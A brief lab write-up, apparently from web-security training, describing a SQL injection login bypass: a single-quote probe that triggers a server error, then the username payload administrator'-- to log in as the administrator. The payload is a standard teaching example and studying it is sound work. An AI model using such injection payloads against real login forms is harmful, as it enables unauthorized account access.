# **Lab 02 - SQL injection vulnerability allowing login bypass**


## Scenario
***
**SQL injection vulnerability** -> longin functionality

**End Goal**                              -> log in as the administrator user
***
## Analysis

### **(1)  Find if the application is vulnerable to SQL injection**

```
'
```

**Conclusion:** The quote is one of the most common used. Indeed, it breaks the query and it originates  an internal server error. So, it is vulnerable to SQLi.

### **(2) Log in as the adminstrator user**

```
administrator'--
```

https://docs.google.com/document/d/1xXm636tRbHaLaUZDtDcXCQBKhIf4lvNFDtTEfmPHFN8/edit?usp=sharing
